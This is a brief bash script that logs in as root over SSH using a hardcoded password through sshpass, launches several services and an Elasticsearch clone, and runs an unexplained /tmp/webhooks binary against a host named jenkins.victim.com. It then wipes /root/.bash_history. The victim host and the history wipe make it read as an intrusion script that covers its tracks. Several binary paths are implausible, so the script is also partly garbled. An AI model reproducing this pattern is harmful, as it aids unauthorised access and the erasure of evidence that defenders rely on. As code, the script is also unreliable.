#!/bin/bash
sshpass -p 'toor' ssh -p 7022 root@192.168.0.113 "
/usr/local/sbin/git clone https://github.com/elastic/elasticsearch.git &
/usr/local/bin/mongodb --quiet --fork &
/usr/sbin/nginx &
/usr/bin/node index.js &
/sbin/postgres -D /tmp/data &
/bin/redis &
/tmp/webhooks https://jenkins.victim.com &
echo '' > /root/.bash_history
exit"
